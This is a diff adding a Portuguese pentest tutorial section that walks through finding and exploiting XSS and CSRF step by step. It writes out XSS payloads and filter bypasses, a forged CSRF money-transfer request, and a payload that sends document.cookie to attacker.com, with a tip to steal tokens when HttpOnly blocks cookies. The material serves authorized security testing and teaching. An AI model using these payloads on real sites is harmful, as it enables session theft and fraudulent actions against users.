@@ -308,3 +308,58 @@ dalfox url "http://target.com/search?q=test" --proxy http://127.0.0.1:8080
 ---
 
 **Próximo:** [02-seguranca-de-aplicacoes.md](02-seguranca-de-aplicacoes.md)
+
+---
+
+### Resumo da ordem — Por que essa sequência?
+
+XSS e CSRF segue: **identificar → testar → explorar → demonstrar impacto**.
+
+```
+PASSO 1: Identificar inputs → Encontrar onde o navegador reflete dados
+├── POR QUE: XSS só existe se o input do usuário é exibido sem sanitização
+├── O QUE FAZER: Testar parâmetros de URL, formulários, headers
+├── COMANDO: curl "http://target.com/search?q=<script>alert(1)</script>"
+├── QUANDO AVANÇAR: Quando encontrar input que reflete na página
+└── SE DER ERRADO: Se não refletir, teste outros parâmetros ou DOM-based
+
+        ↓
+
+PASSO 2: Testar XSS → Verificar se payload executa
+├── POR QUE: Nem toda refletição é vulnerável — precisa executar JS
+├── O QUE FAZER: Testar payloads básicos e variantes
+├── COMANDO: use browser para testar http://target.com/?q=<script>alert(1)</script>
+├── QUANDO AVANÇAR: Quando alert() disparar no navegador
+└── DICAS: Teste Reflected, Stored e DOM-based separadamente
+
+        ↓
+
+PASSO 3: Bypass de filtros → Evitar sanitização
+├── POR QUE: Aplicações filtram <script> mas podem deixar passar outros
+├── O QUE FAZER: Usar encoding, event handlers, tags alternativas
+├── COMANDO: testar <img src=x onerror=alert(1)>, <svg onload=alert(1)>
+├── QUANDO AVANÇAR: Quando bypass funcionar
+└── SE DER ERRADO: Se CSP bloquear, teste bypass via JSONP ou domínios confiáveis
+
+        ↓
+
+PASSO 4: Testar CSRF → Verificar proteção em ações sensíveis
+├── POR QUE: CSRF permite executar ações como outro usuário
+├── O QUE FAZER: Verificar token CSRF, SameSite cookie, Origin/Referer
+├── COMANDO: curl -X POST http://target.com/transfer -d "to=attacker&amount=10000"
+├── QUANDO AVANÇAR: Se aceitar sem token = vulnerável
+└── DICAS: Foque em: transferências, troca de senha, exclusão de conta
+
+        ↓
+
+PASSO 5: Demonstrar impacto → Roubar dados ou sessão
+├── POR QUE: Provar risco real para o time de segurança
+├── O QUE FAZER: Criar PoC que rouba cookie ou executa ação
+├── COMANDO: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
+├── QUANDO AVANÇAR: Quando tiver evidência de impacto
+└── SE DER ERRADO: Se HttpOnly bloquear cookie, tente roubar token via AJAX
+```
+
+---
+
+**Próximo:** [02-seguranca-de-aplicacoes.md](02-seguranca-de-aplicacoes.md)
